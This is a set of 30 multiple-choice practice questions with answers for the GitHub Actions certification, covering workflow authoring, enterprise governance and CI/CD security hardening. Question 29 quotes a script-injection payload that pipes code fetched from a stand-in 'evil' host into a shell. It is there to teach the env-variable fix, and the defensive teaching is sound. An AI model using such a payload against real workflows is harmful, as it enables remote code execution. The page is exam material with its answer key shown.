---
last-updated: 2026-10-22
difficulty: intermediate
---

# GitHub Actions Certification - Practice Questions

30 questions for the GitHub Actions exam (GH-200). Questions 16-30 follow the skills measured as of January 2026: author and manage workflows (20-25%), manage GitHub Actions for the enterprise (20-25%), consume and troubleshoot workflows (15-20%), author and maintain actions (15-20%), and secure and optimize automation (10-15%).

> **Cert page:** [exams/github/actions/](../../exams/github/actions/)

---

### Question 1
**Scenario:** A workflow must run on pull requests to `main` and on a nightly schedule.

A. Two separate repositories
B. `on: workflow_dispatch` only
C. `on: { pull_request: { branches: [main] }, schedule: [{ cron: '0 3 * * *' }] }`
D. `on: push`

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** The `on` key accepts multiple event types with their own filters. Scheduled workflows run on the default branch only and use UTC cron, which is the detail that catches people out when a nightly job fires at the wrong local hour.
</details>

---

### Question 2
**Scenario:** A job must run only after another job succeeds.

A. `needs: <job-id>` on the dependent job
B. Order them in the file, since jobs run top to bottom in the order they are declared in the YAML
C. Split them into separate workflows that are both triggered by the same push event
D. `if: success()` alone on the dependent job, with no other keys

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** Jobs run in parallel by default; `needs` creates the dependency and also makes the upstream job's outputs available. File order has no effect. `if: always()` combined with `needs` is how you build a cleanup job that runs regardless of outcome.
</details>

---

### Question 3
**Scenario:** A matrix must test across three Node versions and two operating systems.

A. `strategy: { matrix: { node: [18, 20, 22], os: [ubuntu-latest, windows-latest] } }`
B. Three workflows
C. A loop in a script
D. Six separate jobs written by hand

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** The matrix expands to the cross product automatically, with `include` and `exclude` for exceptions. `fail-fast: false` is worth knowing: by default one failing combination cancels the rest, which hides whether the failure is specific to one platform.
</details>

---

### Question 4
**Scenario:** A workflow needs to publish a package to a registry using short-lived credentials.

A. A password in the YAML
B. OIDC with a cloud provider or registry trust relationship, requesting a token at run time
C. A long-lived personal access token in a secret, scoped to the registry and rotated by hand every 90 days
D. A shared service account whose password every team member stores in a repository secret and rotates by hand

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** OIDC lets the workflow exchange a signed identity token for short-lived credentials, so no long-lived secret exists to rotate or leak. The trust policy on the other side should be scoped to the specific repository, branch, or environment.
</details>

---

### Question 5
**Scenario:** A deployment job must wait for manual approval.

A. Target an environment with required reviewers configured
B. Ask in chat
C. Add a `sleep` step that holds the job for a fixed time while a reviewer inspects the pending deployment
D. Use a schedule

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** Environments carry protection rules (required reviewers, wait timers, branch restrictions) and their own secrets, so the approval gate and the credentials are bound together. That means production credentials are only reachable from an approved deployment.
</details>

---

### Question 6
**Scenario:** Common workflow logic must be shared across many repositories.

A. Documentation
B. Copy the YAML into each repository and sync changes manually with a scheduled bot pull request
C. A shell script in each repo
D. A reusable workflow called with `uses: org/repo/.github/workflows/build.yml@v1`

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** Reusable workflows are called as a job and can take inputs and secrets; composite actions bundle steps for use inside a job. Either way a fix happens in one place, which is the whole point when 50 repositories share a build.
</details>

---

### Question 7
**Scenario:** A third-party action is referenced as `@v3`.

A. This is fully immutable, because GitHub locks a release tag once the action's owner publishes it
B. SHAs are not supported
C. Only branches can be referenced, not tags or commit SHAs of the action's repository
D. Tags are mutable, so pin third-party actions to a full commit SHA

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** A tag can be repointed by the action's owner, so `@v3` today may not be the same code tomorrow. Pinning to a commit SHA makes the dependency immutable, which is the supply-chain control that matters most for actions with access to your secrets.
</details>

---

### Question 8
**Scenario:** A workflow triggered by `pull_request_target` handles code from a fork.

A. It runs with secrets and write access in the base repo, so never run untrusted fork code in it
B. It is safe by default, because GitHub always runs it in a sandbox with a read-only token and no secrets
C. It cannot access secrets
D. It has no permissions at all, because GitHub only ever lets it read the workflow file from the base branch

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** This is the highest-severity Actions misconfiguration: `pull_request_target` exists so maintainers can label or comment on fork PRs, but checking out the PR head and running its build hands secrets to an attacker. Use `pull_request` for building fork code.
</details>

---

### Question 9
**Scenario:** Dependencies should not be reinstalled on every run.

A. Nothing can be done
B. Use a self-hosted runner only
C. `actions/cache` with a key derived from the lock file hash, plus a restore-keys fallback
D. Commit `node_modules` to the repository so the runner finds every dependency already checked out

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** Keying the cache on the lock file hash means it invalidates exactly when dependencies change. Several setup actions have caching built in, which is simpler. Committing dependencies bloats the repository and creates review noise on every update.
</details>

---

### Question 10
**Scenario:** The default `GITHUB_TOKEN` permissions must follow least privilege.

A. Leave the defaults, because the token is automatically limited to the minimum scopes each step uses
B. Use a personal access token instead
C. Set `permissions:` explicitly at workflow or job level, granting only what each job needs
D. Disable the token

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** Declaring `permissions: contents: read` and adding scopes only where required limits what a compromised step can do. A personal access token is worse: it carries a human's full access and does not expire with the run.
</details>

---

### Question 11
**Scenario:** A self-hosted runner is needed for a workflow that reaches internal systems.

A. Use it on public repositories freely, because each fork pull request gets a fresh isolated virtual machine that is discarded after the job
B. Use them for private repositories, or with strict controls, since fork PRs could run untrusted code
C. There is no risk
D. Self-hosted runners cannot reach internal systems, because they always run inside GitHub's own cloud network space

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** GitHub explicitly warns against self-hosted runners on public repositories, because a fork PR can run arbitrary code on a machine inside your network that is not reset between jobs. Ephemeral runners and runner groups are the mitigations when the requirement is unavoidable.
</details>

---

### Question 12
**Scenario:** A custom action must be written in TypeScript.

A. A workflow YAML file that calls tsc in a run step, with no action.yml file and no declared inputs or outputs
B. Bash only, because composite and JavaScript actions cannot be written in any other language than shell
C. Only container actions are supported, so the TypeScript must be built into a Docker image first
D. A TypeScript action with an `action.yml` declaring inputs, outputs, and the entry point

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** JavaScript actions run directly on the runner and start fastest. Docker container actions offer any language but only run on Linux and pay image pull time. Composite actions wrap existing steps without new code at all.
</details>

---

### Question 13
**Scenario:** Output from one step must be used by a later step.

A. A temporary file only
B. Write to `$GITHUB_OUTPUT` and reference it as `${{ steps.<id>.outputs.<name> }}`
C. Global variables
D. It is not possible

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** Step outputs need a step `id` and a write to the `$GITHUB_OUTPUT` file. `$GITHUB_ENV` sets environment variables for later steps, and job-level `outputs` pass values to a dependent job. The three serve different scopes.
</details>

---

### Question 14
**Scenario:** Actions usage must be governed across an enterprise.

A. Disable Actions for the whole enterprise and require every team to use an external CI system instead of it
B. Review usage after the fact in the audit log each month, and remove any workflow that looks risky or unusual
C. Org and enterprise policies that restrict which actions run (verified creators, allowlist)
D. Trust developers to review each action's source code themselves, and rely on pull request approval to catch risky ones

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** Allowlisting actions is the main supply-chain control at scale, since any action referenced in a workflow runs with access to that workflow's secrets. Runner groups control which repositories can reach which infrastructure.
</details>

---

### Question 15
**Scenario:** A long-running workflow should be cancelled when a newer commit arrives on the same branch.

A. Reduce the timeout-minutes value so that runs from older commits are stopped sooner by the timer
B. A `concurrency` group keyed on the ref with `cancel-in-progress: true`
C. Fewer jobs, so that each run finishes before the next commit arrives and nothing needs cancelling
D. Cancel manually from the Actions tab each time a newer commit arrives on the branch

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** Concurrency groups prevent redundant runs and wasted minutes on superseded commits. For deployments the opposite setting is usually right: same group, `cancel-in-progress: false`, so deployments queue rather than interrupt each other.
</details>

---

### Question 16
**Scenario:** A release workflow is started by hand. The person running it must pick an environment from a fixed list and may optionally tick a "dry run" box that defaults to on.

A. Use `repository_dispatch` with a JSON payload and validate the fields in the first step of the job
B. Read the values from repository variables that the person edits before clicking Run workflow
C. Use `workflow_dispatch` with a `choice` input for the environment and a `boolean` input defaulting to true
D. Use `push` with a commit message convention such as `[env:prod]` and `[dry-run]` that a script in the first step parses at runtime

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** `workflow_dispatch` inputs are typed: a `choice` input shows a fixed list, and a `boolean` input with `default: true` gives the dry-run box, all validated by GitHub before the run starts. `repository_dispatch` is for API callers and has no form or input typing. Editing repository variables before each run is error-prone and changes values for every other workflow too. Parsing commit messages is fragile and is not a manual trigger.
</details>

---

### Question 17
**Scenario:** One workflow file repeats the same block of `env` settings in five jobs. The team wants to define it once in that file without creating a reusable workflow or a composite action.

A. Define the mapping once with a YAML anchor (`&common`) and reuse it with an alias or a merge key (`<<: *common`)
B. Move the block into a separate `env.yml` file and use an `include:` statement at the top of the workflow so every job picks it up
C. Put the block in a reusable workflow and call it from each of the five jobs with `uses:` at job level
D. Copy the block with a matrix that has a single entry so every job inherits it through `strategy`

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** GitHub Actions supports YAML anchors and aliases within a single workflow file, so a mapping defined once with `&` can be reused with `*` or merged with `<<`. Workflow files have no `include:` keyword. A reusable workflow would work for shared jobs, but the question rules it out and it is heavier than needed for a repeated mapping. A matrix generates job variations and does not share settings across separate jobs.
</details>

---

### Question 18
**Scenario:** After tests run, the team wants a formatted Markdown table of results to appear on the workflow run's summary page.

A. Upload the table as an artifact named `summary.md`, which GitHub renders automatically on the run page
B. Echo the table to standard output with a `::notice::` prefix on every line of the table
C. Write the table to `GITHUB_OUTPUT` so it is shown under the job's outputs section
D. Append the Markdown to the file named in `GITHUB_STEP_SUMMARY`

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** Content appended to the `GITHUB_STEP_SUMMARY` file is rendered as Markdown on the run summary page, which is built for test results and coverage. Artifacts are downloadable files and are not rendered on the summary. `::notice::` creates annotations line by line, not a formatted table. `GITHUB_OUTPUT` sets step outputs for later steps and is not displayed as a report.
</details>

---

### Question 19
**Scenario:** Integration tests in a job need a PostgreSQL database for the length of the job on a GitHub-hosted Linux runner.

A. Install PostgreSQL in a `run:` step from a third-party package mirror on every run of the job
B. Declare a `services:` container for PostgreSQL with a health check and mapped port
C. Start a separate workflow that runs the database and call it with `workflow_call`
D. Store a database connection string to a shared production database as a repository secret

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** Service containers start before the job's steps, live for the job, and can be health-checked and reached by port or service name, which is the intended pattern for test databases. Installing PostgreSQL in a step works but is slow and reinvents what `services:` does. A called workflow runs as separate jobs and cannot host a database for another job. Testing against a shared production database risks real data and is never the right answer.
</details>

---

### Question 20
**Scenario:** A matrix run of 12 jobs has one failing job caused by a flaky network call. The team wants to retry only that job.

A. Push an empty commit so the whole workflow runs again from the beginning
B. Edit the workflow to remove the other 11 matrix entries and run it again
C. Cancel the workflow run and start it again with `workflow_dispatch`
D. Use "Re-run failed jobs", or re-run that single matrix job from the run page

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** The run page can re-run only failed jobs or a single job, including one matrix variant, reusing the same commit and inputs. An empty commit reruns everything and adds noise to history. Editing the matrix changes the workflow for a one-off retry. Cancelling and restarting also reruns all 12 jobs and needs a manual trigger to exist.
</details>

---

### Question 21
**Scenario:** An organization wants new repositories to start from a standard CI file that each team can then change freely, with no link back to the original.

A. A workflow template (starter workflow) published in the organization's `.github` repository
B. A reusable workflow in a central repository that each team calls with `uses:` and the `workflow_call` trigger
C. A composite action that bundles the CI steps and is referenced from each workflow
D. A required workflow enforced by a repository ruleset on every repository in the org

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** A workflow template is copied into the repository when chosen, then belongs to that repository with no link back, which matches "change freely". A reusable workflow stays centrally defined and versioned, so changes come from the center. A composite action shares steps, not a whole editable workflow. Required workflows are enforced from the center and cannot be freely changed by teams.
</details>

---

### Question 22
**Scenario:** A scheduled workflow must stop running for two weeks during a migration, and then start again with its history intact.

A. Delete the workflow file and restore it from Git history when the migration ends
B. Rename the file extension from `.yml` to `.txt` so GitHub stops reading it as a workflow
C. Disable the workflow from the Actions tab or with `gh workflow disable`, then enable it later
D. Remove the repository's Actions permission at the organization level for the whole two weeks, then grant it back

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** Disabling a workflow stops new runs while keeping the file and the run history, and enabling it later restores it exactly. Deleting the file loses the workflow from the UI until restored and is a heavier change. Renaming the extension is a hack that also produces a commit and confuses reviewers. Turning off Actions for the whole repository stops every other workflow too.
</details>

---

### Question 23
**Scenario:** A team wants to package three shell steps they repeat in many workflows as a single action, without writing JavaScript or building a container.

A. A Docker container action whose entrypoint runs the three shell commands in order
B. A composite action with `runs: using: composite` and the steps listed in `action.yml`
C. A JavaScript action whose `index.js` calls the three scripts with `child_process`
D. A reusable workflow placed in `.github/workflows` and called from a step with `run:`

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** A composite action lists steps in `action.yml` under `runs: using: composite`, so plain shell steps become one reusable action. A Docker action needs an image, which the team wants to avoid. A JavaScript action needs JavaScript. Reusable workflows are called at job level with `uses:`, not from a step, and they share jobs rather than steps.
</details>

---

### Question 24
**Scenario:** An action publisher wants users to get compatible bug fixes automatically while being protected from breaking changes.

A. Tell users to reference `@main` so they always get the newest commit on the default branch
B. Publish only full commit SHAs and never create tags, so no reference can ever move
C. Publish every change under the same `v1` tag, including breaking changes, so that users only ever need one version
D. Use semantic version releases and move a major tag such as `v1` to the latest compatible release

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** The documented pattern is semantic versions plus a moving major tag: `v1` points to the newest `v1.x.y`, and breaking changes ship as `v2`. Users who want full immutability can still pin a SHA. `@main` exposes users to every unreleased change, including breaking ones. Never tagging removes the easy upgrade path. Shipping breaking changes under `v1` breaks the promise a major tag makes.
</details>

---

### Question 25
**Scenario:** An enterprise has self-hosted runners with access to the payments network. Only two organizations, and only selected repositories in them, may use those runners.

A. Put the runners in a runner group and limit the group's access to those organizations and repositories
B. Label the runners `payments` and trust teams not to use the label in other workflows or in any other organization
C. Register the runners at the repository level in every repository that might need them
D. Put the runners behind an IP allow list so only those repositories can reach them

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** Runner groups control which organizations and repositories may send jobs to a set of runners, which is the access boundary needed. Labels only route jobs and are not an access control. Repository-level registration does not scale and does not stop someone else from registering or reusing them. IP allow lists restrict access to GitHub from networks, not which repositories may run jobs on a runner.
</details>

---

### Question 26
**Scenario:** A secret named `API_KEY` exists at organization, repository and environment level with different values. A job runs with `environment: production`. Which value does it get?

A. The organization value, because organization secrets always override narrower scopes
B. The environment value, because the most specific scope wins
C. The repository value, because environment secrets are only used by deployment APIs
D. The job fails with an error, because duplicate secret names across scopes are not allowed

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** When the same name exists at several levels, the lowest level wins: environment over repository over organization. Organization secrets do not override narrower ones. Environment secrets are available to any job that references the environment. Duplicate names are allowed, which is how per-environment values are meant to work.
</details>

---

### Question 27
**Scenario:** A job needs a specific Java version that differs from the default on `ubuntu-latest`. What is the usual approach?

A. Switch the job to a self-hosted runner, because GitHub-hosted images cannot change their preinstalled Java version
B. Download a JDK in a `run:` step with `curl` and edit `/etc/environment` by hand on each run
C. Use the matching `setup-*` action, such as `actions/setup-java`, to install and select the version
D. Open a support ticket so GitHub adds the Java version to the hosted runner image

<details>
<summary>Answer</summary>

**Correct: C**

**Why:** `setup-*` actions pick a version from the runner's tool cache or download it, then put it on the `PATH`, which is the supported way to change runtimes on hosted runners. Hosted runners can install software at runtime, so a self-hosted runner is not required. Manual downloads work but are slower and harder to maintain. Waiting on an image change is not a plan for one job.
</details>

---

### Question 28
**Scenario:** Security wants to allow only GitHub-authored actions, verified Marketplace creators and two named third-party actions across the organization.

A. Add a CODEOWNERS rule on `.github/workflows` in every repository so security reviews every new action reference
B. Turn on secret scanning push protection for every repository in the organization
C. Fork each allowed action into the organization and delete the upstream reference
D. Set the organization's Actions policy to allow GitHub, verified creators and a list of specific actions

<details>
<summary>Answer</summary>

**Correct: D**

**Why:** The organization Actions policy can restrict use to GitHub-authored actions, verified creators and an explicit allow list, and GitHub enforces it at run time. CODEOWNERS adds review but does not block a merged workflow from using an action. Push protection stops secrets in commits, not action usage. Forking can be part of a strategy, but on its own it blocks nothing.
</details>

---

### Question 29
**Scenario:** A workflow runs on new issues and has the step `run: echo "${{ github.event.issue.title }}"`. Why is this risky, and what is the fix?

A. The title is untrusted and is pasted into the shell script; pass it through an `env:` variable and quote it
B. The step leaks the `GITHUB_TOKEN` into the log; mask the token with `::add-mask::` first
C. The expression is evaluated at parse time and always fails; move it into a `with:` block instead
D. Issue titles may contain Unicode that breaks the runner; base64-encode the title before printing it

<details>
<summary>Answer</summary>

**Correct: A**

**Why:** `${{ }}` is expanded before the shell runs, so a title like `"; curl evil | sh; "` becomes part of the script: that is script injection. Putting the value in an environment variable and referencing `"$TITLE"` makes the shell treat it as data. The step does not print the token. The expression is evaluated at runtime and works, which is the problem. Encoding the title hides the symptom without fixing the injection pattern.
</details>

---

### Question 30
**Scenario:** A team wants consumers of their container image to verify which repository and workflow built it before deploying.

A. Add a `LABEL built-by=ci` line to the Dockerfile, which consumers can read from the image config
B. Generate an artifact attestation for the image in the build workflow and verify it at deploy time
C. Publish a checksum of the image in the README so consumers can compare it by hand
D. Sign each release commit with a GPG key held on the maintainer's laptop and documented in the wiki

<details>
<summary>Answer</summary>

**Correct: B**

**Why:** Artifact attestations create signed provenance tying the image digest to the repository, workflow and commit, and `gh attestation verify` can check it in a deployment gate. A label can be set by anyone who builds an image. A README checksum says nothing about who built it, and the README can change. Signed commits prove who wrote code, not which pipeline built the artifact.
</details>

---

## Where to go deeper

- [GitHub Actions cert page](../../exams/github/actions/) - notes, practice plan, strategy
- [GitHub Administration practice questions](./github-administration.md) - the enterprise exam
- [GHAS practice questions](https://security.noblerworks.com/resources/practice-questions/github-advanced-security/) - security scanning in the pipeline
- [CI/CD explained](../../learn/concepts/cicd-explained.md) - pipelines in plain English
- **[📖 GitHub Certifications](https://learn.github.com/certifications)** - official exam pages
